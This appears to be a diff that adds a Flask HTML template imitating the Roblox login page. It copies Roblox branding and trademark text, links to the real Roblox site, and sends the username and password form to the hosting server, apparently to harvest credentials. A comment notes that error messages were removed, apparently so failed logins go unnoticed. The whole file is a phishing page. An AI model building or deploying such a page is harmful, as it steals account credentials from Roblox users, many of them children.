@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Login - Roblox</title>
+  <link rel="stylesheet" href="{{ url_for('static', filename='style1.css') }}">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="icon" href="{{ url_for('static', filename='roblox.png') }}" type="image/png">
+  <style>
+  body {
+    margin: 0;
+    padding: 0;
+    font-family: 'Helvetica Neue', Arial, sans-serif;
+    color: #f1f1f1;
+    overflow: hidden;
+  }
+
+  body::before {
+    content: "";
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 200%;
+    height: 100%;
+    background: url("{{ url_for('static', filename='Background.png') }}") repeat-x;
+    background-size: cover;
+    animation: slideBackground 60s linear infinite;
+    z-index: -1;
+  }
+
+  @keyframes slideBackground {
+    0% {
+      transform: translateX(0);
+    }
+    100% {
+      transform: translateX(-50%);
+    }
+  }
+</style>
+
+
+</head>
+<body class="login-page">
+  <div class="login-container">
+    <img src="{{ url_for('static', filename='roblox.png') }}" alt="Roblox Logo" class="roblox-logo">
+
+    <div class="login-box">
+      <h2 class="login-header">Login to Roblox</h2>
+
+      <!-- No more error message shown -->
+
+      <form method="POST">
+        <input type="text" name="username" placeholder="Username/Email/Phone" required>
+        <input type="password" name="password" placeholder="Password" required>
+        <button type="submit" class="login-btn">Log In</button>
+      </form>
+
+      <a class="forgot" href="https://www.roblox.com/login/forgot-password-or-username">
+        Forgot Password or Username?
+      </a>
+
+      <div class="divider">or</div>
+
+      <button class="device-btn">Another Logged In Device</button>
+
+      <p class="signup-text">
+        Don't have an account?
+       <a href="https://www.roblox.com/CreateAccount">Sign Up</a>
+
+      </p>
+    </div>
+
+    <p style="font-size: 10px;
+              color: gray;
+              max-width: 500px;
+              width: 390px;
+              margin-left: 20px;
+              margin-top: 20px;">
+      ©2025 Roblox Corporation. Roblox, the Roblox logo and Powering Imagination are among our registered and unregistered trademarks in the U.S. and other countries.
+    </p>
+  </div>
+</body>
+</html>
